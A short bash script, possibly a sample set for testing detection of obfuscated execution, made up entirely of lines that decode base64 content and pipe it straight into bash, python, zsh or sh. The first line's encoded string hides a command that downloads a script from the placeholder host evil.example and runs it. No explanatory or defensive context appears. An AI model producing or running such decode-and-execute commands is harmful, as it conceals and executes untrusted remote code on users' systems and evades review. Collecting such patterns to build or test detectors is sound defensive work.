#!/usr/bin/env bash

echo "Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9wYXlsb2FkLnNoIHwgYmFzaAo=" | base64 -d | bash
base64 --decode payload.b64 | python
openssl enc -d -base64 -in payload.txt | zsh
base64 -d payload.b64 && sh payload
